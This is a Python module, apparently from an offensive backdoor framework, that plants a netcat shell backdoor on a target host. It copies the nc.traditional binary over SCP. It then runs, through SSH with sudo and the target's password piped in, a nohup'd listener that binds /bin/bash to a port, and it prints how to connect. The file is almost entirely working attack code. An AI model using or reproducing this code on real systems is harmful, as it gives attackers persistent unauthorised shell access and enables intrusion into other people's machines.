from backdoors.backdoor import *

class Netcat_Traditional(Backdoor):
    prompt = Fore.RED + "(nct) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using netcat-traditional module"
        self.core = core
        self.options = {
                "port"   : Option("port", 53926, "port to connect to", True),
                }
        self.modules = {} 
        self.allow_modules = True
        self.help_text = INFO + "Utilizes netcat's traditional -e option to create a reverse shell." 

    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S nohup ./nc.traditional -l -p %s -e /bin/bash" % self.get_value("port")

    def do_exploit(self, args):
        target = self.core.curtarget
        port = self.get_value("port")
        print(INFO + "Shipping netcat-traditional package.")
        target.scpFiles(self, '/bin/nc.traditional', False)
        print(GOOD + "Initializing backdoor on port %s..." % port)
        target.ssh.exec_command(self.get_command())
        print(GOOD + "Backdoor attempted. Use nc " + target.hostname + " %s." % port)
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit()
